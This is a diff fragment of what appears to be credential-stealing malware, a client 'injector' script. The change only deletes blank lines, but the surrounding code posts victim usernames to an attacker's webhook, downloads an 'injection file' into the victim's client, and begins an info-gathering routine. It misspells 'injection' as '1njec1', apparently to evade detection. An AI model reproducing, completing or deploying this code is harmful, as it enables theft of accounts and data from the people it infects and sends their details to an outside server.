@@ -129,7 +129,6 @@ except:
         requests.post(hook,json={"content": f"Could not 1njec1 {user}"})
     except:
         pass
-
 try:
     import os,requests,subprocess
     def download(url, dest):
@@ -151,7 +150,6 @@ try:
 except Exception as e:
     try:requests.post(hook,json={"content": f"Could not download the 1njec1ion file: {user}"})
     except:pass
-
 def info():
             import json
             from urllib.request import urlopen, Request
